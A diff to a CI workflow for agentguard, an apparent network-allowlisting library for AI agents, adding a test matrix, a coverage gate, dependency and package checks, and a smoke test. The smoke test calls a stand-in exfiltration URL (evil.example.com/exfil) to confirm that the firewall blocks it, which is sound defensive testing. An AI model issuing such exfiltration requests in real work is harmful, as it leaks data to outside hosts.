@@ -5,19 +5,175 @@ on:
     branches: [main]
   pull_request:
     branches: [main]
+  workflow_dispatch:
+
+# Cancel in-flight runs for the same branch/PR.
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
 
 jobs:
   test:
-    runs-on: ubuntu-latest
+    name: Node ${{ matrix.node }} / ${{ matrix.os }}
+    runs-on: ${{ matrix.os }}
     strategy:
       fail-fast: false
       matrix:
-        node: [20, 22, 24]
+        node: ['20', '22', '24']
+        os: [ubuntu-latest]
+        include:
+          # Spot-check the LTS on macOS + Windows so we don't ship
+          # URL-parsing or fetch-wrapper regressions to those users.
+          - node: '22'
+            os: macos-latest
+          - node: '22'
+            os: windows-latest
+
     steps:
       - uses: actions/checkout@v4
+
       - uses: actions/setup-node@v4
         with:
           node-version: ${{ matrix.node }}
-      - run: node --version
-      - run: npm test
-      - run: npm run test:examples
+          cache: npm
+
+      - name: Install
+        run: npm ci
+
+      - name: Unit tests
+        run: npm test
+
+      - name: Runnable examples (smoke)
+        run: npm run test:examples
+
+  deny-by-default-smoke:
+    name: deny-by-default smoke
+    runs-on: ubuntu-latest
+    needs: test
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      # The whole point of agentguard is "an un-allowlisted fetch throws."
+      # If a refactor ever silently disables the wrapper or makes the
+      # default permissive, this smoke test catches it before release.
+      # No npm install needed (zero runtime deps).
+      - name: Assert un-allowlisted fetch is blocked
+        run: |
+          node --input-type=module -e '
+            import { policy, firewall, PolicyViolation } from "./src/index.js";
+
+            const p = policy({ network: { allow: ["allowed.example.com"] } });
+            let threw = false;
+            try {
+              await firewall(p, async () => {
+                await fetch("https://evil.example.com/exfil");
+              });
+            } catch (err) {
+              if (err instanceof PolicyViolation) {
+                threw = true;
+              } else {
+                console.error("Caught wrong error type:", err);
+                process.exit(1);
+              }
+            }
+            if (!threw) {
+              console.error("FAIL: deny-by-default smoke did not throw. The firewall is not enforcing.");
+              process.exit(1);
+            }
+            console.log("ok: un-allowlisted fetch was blocked");
+          '
+
+  coverage:
+    name: coverage gate
+    runs-on: ubuntu-latest
+    needs: test
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: npm
+
+      - name: Install
+        run: npm ci
+
+      # Thresholds encoded in the npm script (75% branches /
+      # 85% lines+functions+statements). c8 fails the job below them.
+      - name: Coverage
+        run: npm run test:coverage
+
+  zero-runtime-deps-gate:
+    name: zero runtime deps
+    runs-on: ubuntu-latest
+    needs: test
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      # The whole pitch of this library is "zero runtime dependencies."
+      # For a security primitive, this matters double: every transitive
+      # dep is a place where the gate could be silently weakened.
+      - name: Assert package.json has no runtime dependencies
+        run: |
+          node -e '
+            const pkg = require("./package.json");
+            const deps = pkg.dependencies || {};
+            const keys = Object.keys(deps);
+            if (keys.length > 0) {
+              console.error("agentguard is zero-runtime-dep by design.");
+              console.error("This PR adds: " + keys.join(", "));
+              console.error("Security primitives should not pull in transitive deps. If this is intentional, remove this CI step in the same PR and explain why in the PR description.");
+              process.exit(1);
+            }
+          '
+
+  package-smoke:
+    name: npm pack content check
+    runs-on: ubuntu-latest
+    needs: test
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: npm pack dry-run + content check
+        run: |
+          npm pack --dry-run
+          npm pack --json | node -e '
+            const fs = require("fs");
+            const j = JSON.parse(fs.readFileSync(0, "utf8"));
+            const files = j[0].files.map(f => f.path);
+            const required = [
+              "src/index.js",
+              "src/index.d.ts",
+              "src/cli.js",
+              "src/policy.js",
+              "src/firewall.js",
+              "src/violations.js",
+              "README.md",
+              "LICENSE",
+            ];
+            const missing = required.filter(r => !files.includes(r) && !files.some(f => f.startsWith(r)));
+            if (missing.length) {
+              console.error("missing from tarball:", missing);
+              process.exit(1);
+            }
+            const leaked = files.filter(f => f.startsWith("node_modules/"));
+            if (leaked.length) {
+              console.error("node_modules leaked into tarball:", leaked);
+              process.exit(1);
+            }
+          '
